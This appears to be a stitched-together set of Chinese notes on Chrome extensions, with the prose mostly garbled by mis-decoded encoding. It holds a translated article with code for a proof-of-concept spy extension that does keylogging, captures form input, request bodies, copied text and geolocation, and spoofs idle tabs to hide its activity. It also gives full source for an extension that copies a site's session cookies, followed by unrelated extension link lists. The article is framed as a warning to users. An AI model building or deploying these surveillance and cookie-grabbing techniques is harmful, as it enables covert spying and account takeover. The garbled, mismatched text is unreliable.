æ‚¨çš„æµè§ˆå™¨æ‰©å±•ç¨‹åºç°åœ¨æ­£åœ¨æ•è·æ‚¨çš„å±å¹•å—ï¼Ÿä½ æ°¸è¿œä¸ä¼šçŸ¥é“ï¼

### ç”¨æˆ·å¯¼èˆª

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ API è½»æ¾å®æ—¶è·Ÿè¸ªç”¨æˆ·çš„æµè§ˆæ´»åŠ¨ï¼š`webNavigation`

background.js

```js
chrome.webNavigation.onCompleted.addListener((details) => {
  // {
  //   "documentId": "F5009EFE5D3C074730E67F5C1D934C0A",
  //   "documentLifecycle": "active",
  //   "frameId": 0,
  //   "frameType": "outermost_frame",
  //   "parentFrameId": -1,
  //   "processId": 139,
  //   "tabId": 174034187,
  //   "timeStamp": 1676958729790.8088,
  //   "url": "https://www.linkedin.com/feed/"
  // }
});
```

### é¡µé¢æµé‡

è¯¥ API å…è®¸æˆ‘ä»¬æŸ¥çœ‹æ¯ä¸ªé€‰é¡¹å¡ä¸­çš„æ‰€æœ‰ç½‘ç»œæµé‡ï¼Œä½¿ç”¨ æ¢³ç†å‡ºç½‘ç»œæµé‡ï¼Œå¹¶æå–æ•è·å‡­æ®ã€åœ°å€ç­‰ï¼š`webRequest`ã€`requestBody`

background.js

```js
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (details.requestBody) {
      // Capture requestBody data
    }
  },
  {
    urls: ["<all_urls>"],
  },
  ["requestBody"]
);
```

### é”®ç›˜è®°å½•

ç”±äºæ¯ä¸ªé¡µé¢ä¸Šéƒ½è¿è¡Œä¸€ä¸ªå†…å®¹è„šæœ¬ï¼Œå› æ­¤é˜…è¯»å‡»é”®éå¸¸å®¹æ˜“ã€‚åˆ›å»ºä¸€ä¸ªå®šæœŸåˆ·æ–°çš„å‡»é”®ç¼“å†²åŒºå°†ä¸ºæˆ‘ä»¬æä¾›æ˜“äºé˜…è¯»çš„æ¼‚äº®è¿ç»­å‡»é”®ã€‚

content-script.js

```js
let buffer = "";

const debouncedCaptureKeylogBuffer = _.debounce(async () => {
  if (buffer.length > 0) {
    // Flush the buffer

    buffer = "";
  }
}, 1000);

document.addEventListener("keyup", (e: KeyboardEvent) => {
  buffer += e.key;

  debouncedCaptureKeylogBuffer();
});
```

### è¾“å…¥æ•è·

ä»å†…å®¹è„šæœ¬ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åªä¾¦å¬ `input` ä»»ä½•å¯ç¼–è¾‘å…ƒç´ ä¸Šçš„äº‹ä»¶å¹¶æ•è·å®ƒä»¬çš„ä»·å€¼ã€‚ 

content-script.js

```js
[...document.querySelectorAll("input,textarea,[contenteditable]")].map((input) =>
  input.addEventListener("input", _.debounce((e) => {
    // Read input value
  }, 1000))
);
```

å¦‚æœæˆ‘ä»¬æœŸæœ›é¡µé¢ DOM ç»å¸¸æ›´æ”¹ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ SPAï¼‰ï¼Œæˆ‘ä»¬å½“ç„¶ä¸æƒ³é”™è¿‡ä»»ä½•æœ‰ä»·å€¼çš„æ•°æ®ã€‚åªéœ€è®¾ç½® a å³å¯è§‚çœ‹æ•´ä¸ªé¡µé¢ï¼Œå¹¶æ ¹æ®éœ€è¦é‡æ–°åº”ç”¨ä¾¦å¬å™¨ã€‚`MutationObserver`

content-script.js

```js
const inputs: WeakSet<Element> = new WeakSet();

const debouncedHandler = _.debounce(() => {
  [...document.querySelectorAll("input,textarea,[contenteditable")]
    .filter((input: Element) => !inputs.has(input))
    .map((input) => {
      input.addEventListener(
        "input",
        _.debounce((e) => {
          // Read input value
        }, 1000)
      );

      inputs.add(input);
    });
}, 1000);

const observer = new MutationObserver(() => debouncedHandler());
observer.observe(document.body, { subtree: true, childList: true });
```



### å‰ªè´´æ¿æ•è·

è¿™ä¸ªæœ‰ç‚¹æ£˜æ‰‹ã€‚ æˆ–ä»»ä½•å…¶ä»–å‰ªè´´æ¿ API æ–¹æ³•å°†æç¤ºç”¨æˆ·æƒé™å¯¹è¯æ¡†ï¼Œå› æ­¤è¿™äº›æ˜¯ç¦æ­¢çš„ã€‚ 

```js
navigator.clipboard.read()
```



![img](./Chromeæ’ä»¶å¼€å‘å…¥é—¨.assets/59d6015e-fd8d-4550-a954-2220f293d332_1286x738.jpeg)



ç”¨äº å°†å‰ªè´´æ¿è½¬å‚¨åˆ°éšè—è¾“å…¥ä¸­æ˜¯ä¸å¯é çš„ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½ä»é¡µé¢ä¸­æŠ“å–æ‰€é€‰æ–‡æœ¬ã€‚`document.execCommand("paste")`

content-script.js

```js
document.addEventListener("copy", () => {
  const selected = window.getSelection()?.toString();

  // Capture selected text on copy events
});
```

ï¼ˆæ³¨æ„ï¼šæˆ‘å¯¹æ­¤å¹¶ä¸å®Œå…¨æ»¡æ„ï¼Œä½†ç°åœ¨å·²ç»è¶³å¤Ÿäº†ã€‚

### æ•è·åœ°ç†ä½ç½®

åœ°ç†ä½ç½®æ•è·æ˜¯æœ€æ£˜æ‰‹çš„ï¼Œå› ä¸º Chrome å¯¹ä½•æ—¶ä»¥åŠå¦‚ä½•æ•è·å®ƒè¿›è¡Œäº†é™åˆ¶ã€‚æ·»åŠ  æƒé™ä»…å…è®¸æˆ‘ä»¬æ•è·*æ‰©å±•é¡µé¢*å†…çš„ä½ç½®ï¼Œè€Œä¸èƒ½ä»å†…å®¹è„šæœ¬ä¸­æ•è·ä½ç½®ã€‚å¦‚æœå¼¹å‡ºçª—å£æ‰“å¼€çš„é¢‘ç‡è¶³å¤Ÿé«˜ï¼Œè¿™å¯èƒ½å°±è¶³å¤Ÿäº†ã€‚`geolocation`

popup.js

```js
navigator.geolocation.getCurrentPosition(
  (position) => {
    // Capture position
  },
  (e) => {},
  {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0,
  }
);
```

å¦‚æœæˆ‘ä»¬éœ€è¦*æ›´å¤š*åœ°ç†ä½ç½®æ•°æ®ï¼Œåˆ™éœ€è¦ä»å†…å®¹è„šæœ¬ä¸­å®Œæˆã€‚æˆ‘ä»¬éœ€è¦é˜²æ­¢æµè§ˆå™¨ç”Ÿæˆæƒé™å¯¹è¯æ¡†ï¼Œå› æ­¤é¦–å…ˆæˆ‘ä»¬æ£€æŸ¥é¡µé¢æ˜¯å¦å·²ç»å…·æœ‰åœ°ç†ä½ç½®æƒé™ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥é™é»˜åœ°è¯·æ±‚ä½ç½®ã€‚

content-script.js

```js
navigator.permissions
  .query({ name: "geolocation" })
  .then(({ state }: { state: string }) => {
    if (state === "granted") {
      captureGeolocation();
    }
  });
```

### éšèº«é€‰é¡¹å¡

å¦‚æœä½ å’Œæˆ‘ä¸€æ ·ï¼Œä½ ä¼šæ‰“å¼€ä¸€å¤§å †æ ‡ç­¾ã€‚å¤§å¤šæ•°æ ‡ç­¾é¡µä¼šé•¿æ—¶é—´é—²ç½®ï¼ŒChrome ä¼šæ€¥åˆ‡åœ°å¸è½½ç©ºé—²æ ‡ç­¾é¡µä»¥é‡Šæ”¾ç³»ç»Ÿèµ„æºã€‚

å‡è®¾æˆ‘ä»¬éœ€è¦åœ¨ç”¨æˆ·ä¸æ³¨æ„çš„æƒ…å†µä¸‹åœ¨é€‰é¡¹å¡ä¸­æ‰“å¼€æ‰©å±•é¡µé¢ã€‚ä¹Ÿè®¸æˆ‘ä»¬éœ€è¦ä½¿ç”¨ WebExtensions API æ‰§è¡Œä¸€äº›é¢å¤–çš„é¡µé¢çº§å¤„ç†ã€‚æ‰“å¼€å’Œå…³é—­ä¸€ä¸ªæ–°é€‰é¡¹å¡ä¼šå¯¼è‡´é€‰é¡¹å¡æ ä¸­å‡ºç°å¤§é‡è§†è§‰ç§»åŠ¨ï¼Œè¿™å¤ªå¯ç–‘äº†ã€‚ç›¸åï¼Œè®©æˆ‘ä»¬é‡ç”¨ç°æœ‰é€‰é¡¹å¡å¹¶ä½¿å…¶*çœ‹èµ·æ¥åƒ*æ—§é€‰é¡¹å¡ã€‚

è¿™å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼å·¥ä½œï¼š

1. æŸ¥æ‰¾ç”¨æˆ·æœªæ³¨æ„çš„å€™é€‰é€‰é¡¹å¡ã€‚
2. è®°å½•å…¶ URLã€ç½‘ç«™å›¾æ ‡ URL å’Œæ ‡é¢˜ã€‚
3. å°†è¯¥é€‰é¡¹å¡æ›¿æ¢ä¸ºæˆ‘ä»¬çš„æ‰©å±•é¡µé¢ï¼Œå¹¶ç«‹å³æ›¿æ¢å›¾æ ‡å’Œæ ‡é¢˜ï¼Œä½¿å…¶ç±»ä¼¼äºåŸå§‹é€‰é¡¹å¡ã€‚
4. åšåäº‹ã€‚
5. é¡µé¢å®Œæˆåï¼Œæˆ–ç”¨æˆ·æ‰“å¼€é€‰é¡¹å¡åï¼Œå¯¼èˆªå›åŸå§‹ URLã€‚

è®©æˆ‘ä»¬æ„å»ºä¸€ä¸ªæ¦‚å¿µéªŒè¯ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ‰“å¼€éšèº«é€‰é¡¹å¡çš„ç¤ºä¾‹åå°è„šæœ¬ï¼š

background.js

```js
export async function openStealthTab() {
  const tabs = await chrome.tabs.query({
    // Don't use the tab the user is looking at
    active: false,
    // Don't use pinned tabs, they're probably used frequently
    pinned: false,
    // Don't use a tab generating audio
    audible: false,
    // Don't use a tab until it is finished loading
    status: "complete",
  });

  const [eligibleTab] = tabs.filter((tab) => {
    // Must have url and id
    if (!tab.id || !tab.url) {
      return false;
    }

    // Don't use extension pages
    if (new URL(tab.url).protocol === "chrome-extension:") {
      return false;
    }

    return true;
  });

  if (eligibleTab) {
    // These values will be used to spoof the current page
    // and navigate back
    const searchParams = new URLSearchParams({
      returnUrl: eligibleTab.url as string,
      faviconUrl: eligibleTab.favIconUrl || "",
      title: eligibleTab.title || "",
    });

    const url = `${chrome.runtime.getURL(
      "stealth-tab.html"
    )}?${searchParams.toString()}`;

    // Open the stealth tab
    await chrome.tabs.update(eligibleTab.id, {
      url,
      active: false,
    });
  }
}
```

è¿™æ˜¯æˆ‘ä»¬çš„éšèº«é€‰é¡¹å¡è„šæœ¬ï¼šstealth-tab.js

```js
const searchParams = new URL(window.location.href).searchParams;

// Spoof the previous page tab appearance
document.title = searchParams.get('title);
document.querySelector(`link[rel="icon"]`)
  .setAttribute("href", searchParams.get('faviconUrl'));

function useReturnUrl() {
  // User focused this tab, flee!
  window.location.href = searchParams.get('returnUrl');
}

// Check to see if this page is visible on load
if (document.visibilityState === "visible") {
  useReturnUrl();
}

document.addEventListener("visibilitychange", () => useReturnUrl());

// Now do bad things

// Done doing bad things, return!
useReturnUrl();
```

![img](./Chromeæ’ä»¶å¼€å‘å…¥é—¨.assets/2357fbff-093e-441f-bf95-9a27cb461ce2_782x324.jpeg)



è¿™é‡Œæ²¡ä»€ä¹ˆå¯ç–‘çš„ï¼

## å‘å¸ƒåˆ° Chrome ç½‘ä¸Šåº”ç”¨åº—

å½“ç„¶ï¼Œæˆ‘æ˜¯åœ¨å¼€ç©ç¬‘ã€‚æ­¤æ‰©å±•å°†åœ¨å®¡æŸ¥é˜Ÿåˆ—ä¸­è¢«å˜²ç¬‘ã€‚

è¿™ä¸ªæ‰©å±•æ˜¾ç„¶æ˜¯æ¶æ„æ‰©å±•çš„æ¼«ç”»ï¼Œä½†è®¤ä¸ºå¯ä»¥ä½¿ç”¨è¿™ç§è¡Œä¸ºçš„å­é›†æ˜¯ä¸æ˜¯å¾ˆç–¯ç‹‚ï¼Ÿåœ¨å®‰è£…çœ‹ä¼¼å€¼å¾—ä¿¡èµ–çš„ Chrome æ‰©å±•ç¨‹åº ï¼ˆæ— è®ºè¿™æ„å‘³ç€ä»€ä¹ˆï¼‰æ—¶ï¼Œå¤§å¤šæ•°ç”¨æˆ·éƒ½ä¼šå¿½ç•¥æƒé™è­¦å‘Šæ¶ˆæ¯ï¼Œæ— è®ºå®ƒä»¬å¤šä¹ˆå¯æ€•ã€‚ä¸€æ—¦ä½ æ¥å—äº†æƒé™ï¼Œä½ å°±ä»»ç”±æ‰©å±•ç¨‹åºæ‘†å¸ƒã€‚

ä½ å¯èƒ½ä¼šæƒ³ï¼šâ€œé©¬ç‰¹ï¼Œè¿™è‚¯å®šä¸é€‚ç”¨äºæˆ‘ï¼æˆ‘æ˜¯ä¸€ä¸ªç²¾æ˜çš„æŠ€æœ¯å¤§å¸ˆï¼Œç»†å¿ƒã€æŒ‘å‰”ã€è°„åªšã€‚æ²¡æœ‰äººèƒ½æŠŠä¸€ä¸ªæ‹‰åˆ°æˆ‘èº«ä¸Šã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ç—´è¿·çš„æœ‹å‹ï¼Œè¯·å›ç­”ä»¥ä¸‹é—®é¢˜ï¼š

- ä¸ç”¨çœ‹ï¼Œä½ èƒ½è¯´å‡ºä½ ç°åœ¨å®‰è£…çš„ä¸€åŠä»¥ä¸Šçš„æ‰©å±•å—ï¼Ÿ
- è°æ¥ç»´æŠ¤å®ƒä»¬ï¼Ÿå®ƒæ˜¯æ‚¨é¦–æ¬¡å®‰è£…æ—¶ç»´æŠ¤å®ƒçš„åŒä¸€å®ä½“å—ï¼Ÿæ˜¯å¦ç¡®å®šï¼Ÿ
- ä½ çœŸçš„ ä»”ç»†å®¡æŸ¥äº†ä»–ä»¬çš„æƒé™å—ï¼Ÿ

## å¦‚æœä½ æ•¢çš„è¯ï¼Œè¯•è¯•å§

æ‚¨å¯ä»¥åœ¨æ­¤å¤„æµ‹è¯•é—´è°æ‰©å±•ï¼šhttps://github.com/msfrisbie/spy-extension

æˆ‘æ·»åŠ äº†ä¸€ä¸ªé€‰é¡¹é¡µé¢ï¼Œå› æ­¤æ‚¨å¯ä»¥çœ‹åˆ°æ‰©å±•ç¨‹åºèƒ½å¤Ÿä»æµè§ˆå™¨ä¸­å¸å–çš„æ‰€æœ‰æ å¤ºæ•°æ®ã€‚æˆ‘ä¸ä¼šå‘å¸ƒå±å¹•æˆªå›¾;å¯ä»¥è¯´ï¼Œé¡µé¢çš„å†…å®¹*æœ‰ç‚¹*å¦¥åã€‚

æ”¶é›†åˆ°çš„ä»»ä½•å†…å®¹éƒ½ä¸ä¼šç¦»å¼€æ‚¨çš„æµè§ˆå™¨ã€‚æˆ–è€…æ˜¯å—ï¼Ÿï¼ˆä¸ï¼Œå®ƒæ²¡æœ‰ï¼‰

Matt Frisbie æ˜¯[ã€ŠBuilding Browser Extensions](https://www.buildingbrowserextensions.com/)ã€‹ä¸€ä¹¦çš„ä½œè€…

æ‚¨å¯ä»¥é€šè¿‡ [mattfriz.com](https://www.mattfriz.com/) ä¸æˆ‘è”ç³»

# è½»æ¾è·å–äº¬ä¸œcookieçš„æ’ä»¶---é™„æ•™ç¨‹

### background.js

```js

chrome.browserAction.onClicked.addListener(function () {
    showCookie();
});

function text2clip(text) {
    var copyFrom = document.createElement("textarea");
    copyFrom.textContent = text;
    var body = document.getElementsByTagName('body')[0];
    body.appendChild(copyFrom);
    copyFrom.select();
    document.execCommand('copy');
    body.removeChild(copyFrom);
}
function notify(msg) {
    if (window.Notification) { new Notification(chrome.app.getDetails().name, { icon: chrome.app.getDetails().icons['48'], body: msg }); }
}




async function showCookie() {
    let cookieString = await getIdFromCookie();
    text2clip(cookieString);
    notify("Cookies å·²ç»æˆåŠŸå¤åˆ¶åˆ°å‰ªåˆ‡æ¿ã€‚");
}

async function getIdFromCookie() {
    let promise1 = new Promise((resolve, reject) => {
        chrome.tabs.getSelected(null, function (tab) {
            var url = tab.url;
            var arr = url.split("/");
            var result = arr[0] + '//' + arr[2]

            resolve(result)
        })
    })

    let domain = await promise1;
    console.log("domain", domain);
    let stringCookie = "";
    let promise = new Promise((resolve, reject) => {
        chrome.cookies.getAll({
            url: domain
        }, async function (cookies) {
            for (var i = 0; i < cookies.length; i++) {
                if (cookies[i].name.length > 0 && cookies[i].value.length > 0) {
                    stringCookie = stringCookie + cookies[i].name + "=" + cookies[i].value + "; ";
                }
            }
            resolve(stringCookie);

        });
    })
    try {
        let result = await promise;
        return result;
    } catch (error) {
        return false;
    }
}
```

### manifest.json

```json

{
  "manifest_version": 1,
  "name": "JDCookie",
  "description": "One click copy cookies to your clipboard",
  "author": "xxx",
  "version": "1.0",
  "background": {"persistent": true,"scripts": ["background.js"]},
  "icons": { "16": "icon_16.png","48": "icon_48.png","128": "icon_128.png" },
  "permissions": [ "cookies", "tabs", "http://*/", "https://*/", "<all_urls>","clipboardWrite","clipboardRead","notifications","declarativeContent","activeTab"],
  "browser_action": {
    "default_icon": "icon.png",
    "default_title": "ç‚¹å‡»æ‹·è´Cookie"
  }
}
```

### ä½¿ç”¨æ–¹æ³•ï¼š

- å°†**background.jså’Œmanifest.jsonæ”¾åœ¨æ–°å»ºçš„æ–‡ä»¶å¤¹JDCookieä¹‹ä¸‹ï¼›**
- ç‚¹å‡»`åŠ è½½å·²è§£å‹çš„æ‹“å±•ç¨‹åº`ï¼Œé€‰æ‹©`JDCookie`ç›®å½•ï¼›
- ç™»å½•äº¬ä¸œ,æ ¹æ®æç¤ºç”Ÿæˆicon_16.pngï¼Œicon_48.pngï¼Œicon_128.pngï¼›
- ç‚¹å‡»`JDCookie`å³å¯æ‹·è´äº¬ä¸œcookieï¼›

# Chrome å¼€æºæ’ä»¶

- [Anarios/return-youtube-dislikeï¼šç”¨äºè¿”å› youtube ä¸å–œæ¬¢çš„ Chrome æ‰©å±•ç¨‹åº (github.com)](https://github.com/Anarios/return-youtube-dislike)
- [scriptscat/scriptcat: è„šæœ¬çŒ«ï¼Œä¸€ä¸ªå¯ä»¥æ‰§è¡Œç”¨æˆ·è„šæœ¬çš„æµè§ˆå™¨æ‰©å±• (github.com)](https://github.com/scriptscat/scriptcat)

- [lcomplete/huntly: Huntly, information management tool, rss reader, automatic saving browsed contents include tweets, github stars management tool. ä¿¡æ¯ç®¡ç†å·¥å…·ã€RSS é˜…è¯»å™¨ã€GitHub stars ç®¡ç†ã€æ¨æ–‡ç®¡ç†ã€è‡ªåŠ¨è®°å½•æµè§ˆè¿‡çš„æ–‡ç« ã€‚](https://github.com/lcomplete/huntly)
- [chibat/chrome-extension-typescript-starterï¼šChrome æ‰©å±•ç¨‹åº TypeScript Starter (github.com)](https://github.com/chibat/chrome-extension-typescript-starter)
- [AutomaApp/automaï¼šä¸€ä¸ªæµè§ˆå™¨æ‰©å±•ï¼Œç”¨äºé€šè¿‡è¿æ¥å—æ¥è‡ªåŠ¨åŒ–æµè§ˆå™¨ (github.com)](https://github.com/AutomaApp/automa)
- [mika-cn/maoxian-web-clipperï¼šç”¨äºä»ç½‘é¡µä¸­å‰ªè¾‘ä¿¡æ¯çš„ Web æ‰©å±•ã€‚å°†å…¶ä¿å­˜åˆ°æœ¬åœ°è®¡ç®—æœºä»¥é¿å…ä¿¡æ¯å¤±æ•ˆã€‚ä¸æ— èŠçš„æ³¨å†Œï¼Œä¸æ”¶è´¹ã€‚ (github.com)](https://github.com/mika-cn/maoxian-web-clipper)
- [ä¸€ä¸ªä¿®æ”¹Ajaxè¯·æ±‚å“åº”ç»“æœçš„Chromeæ‰©å±•æ’ä»¶](https://github.com/PengChen96/ajax-tools)

### Bç«™ç›¸å…³æ’ä»¶

ã€bç«™è¿˜èƒ½è£…æ’ä»¶ï¼Ÿä¸‰åˆ†é’Ÿè®©ä½ çš„bç«™åƒå¼€å¤–æŒ‚ä¸€æ ·å¥½ç”¨ï¼ã€‘https://www.bilibili.com/video/BV15t421P7Dt?vd_source=36c9491a7fa2ab8a22ca060af01b7472

BiliPlusï¼šhttps://github.com/0xlau/biliplus

BiliScopeï¼šhttps://github.com/gaogaotiantian/biliscope

BewlyBewlyï¼šhttps://github.com/hakadao/BewlyBewly

pakkuï¼šå“”å“©å“”å“©å¼¹å¹•è¿‡æ»¤å™¨ï¼šhttps://github.com/xmcp/pakku.js

Bilibili-Evolvedï¼šhttps://github.com/the1812/Bilibili-Evolved

bilibili-app-recommendï¼šhttps://greasyfork.org/zh-CN/scripts/443530-bilibili-app-recommend

é¦–é¡µæ¨èï¼šhttps://github.com/indefined/UserScripts

æŠ½å¥–å–å…³ï¼šhttps://greasyfork.org/zh-CN/scripts/387046

Bilibili æŒ‰æ ‡ç­¾ã€æ ‡é¢˜ã€æ—¶é•¿ã€UPä¸»å±è”½è§†é¢‘ï¼šhttps://greasyfork.org/zh-CN/scripts/481629

bç«™å±è”½å¢å¼ºå™¨ï¼šhttps://greasyfork.org/zh-CN/scripts/461382-b%E7%AB%99%E5%B1%8F%E8%94%BD%E5%A2%9E%E5%BC%BA%E5%99%A8

# Chrome æ’ä»¶æ¨è

[æ¨è10ä¸ª"ä¸èƒ½é”™è¿‡"çš„ Chrome æ’ä»¶ç»™å·¥å‹ä»¬ğŸ”¥ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7095524318339137573)

[å¼ºæ¨ 20 æ¬¾å®ç”¨çš„ Chrome æµè§ˆå™¨æ’ä»¶ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7327893130572824611)

[è¶…å¥½ç”¨çš„ chrome æµè§ˆå™¨æ’ä»¶æ¨èï¼ˆå¤–è¯­é˜…è¯»å›°éš¾è€…ç¦éŸ³ï¼‰ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7320474963062882345)

[ã€åˆ©å™¨ç¯‡ã€‘35+ç²¾é€‰chromeæ’ä»¶ï¼Œå«15+å‰ç«¯æ’ä»¶ï¼Œæ€»æœ‰ä¸€æ¬¾å€¼å¾—ä½ åœç•™ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6998300409173377032)

[Chromeæµè§ˆå™¨å¿…å¤‡æ’ä»¶æ¨è - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7126191827715096583)

[ã€ŠChromeæ’ä»¶è‹±é›„æ¦œã€‹çè—çš„100ä¸ªChromeæ’ä»¶ï¼Œä¸ªä¸ªæ˜¯ç²¾å“! æ”¶è—å°±æ˜¯èµšåˆ°~ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6943560672936460301)

## æ’ä»¶ä¸‹è½½ç½‘ç«™

[æç®€æ’ä»¶å®˜ç½‘_Chromeæ’ä»¶ä¸‹è½½_Chromeæµè§ˆå™¨åº”ç”¨å•†åº— (zzzmh.cn)](https://chrome.zzzmh.cn/)

[Crxæœæœ - ä¸€ä¸ªç‰›Xçš„æ‰©å±•å’Œåº”ç”¨å•†åº— (crxsoso.com)](https://www.crxsoso.com/)
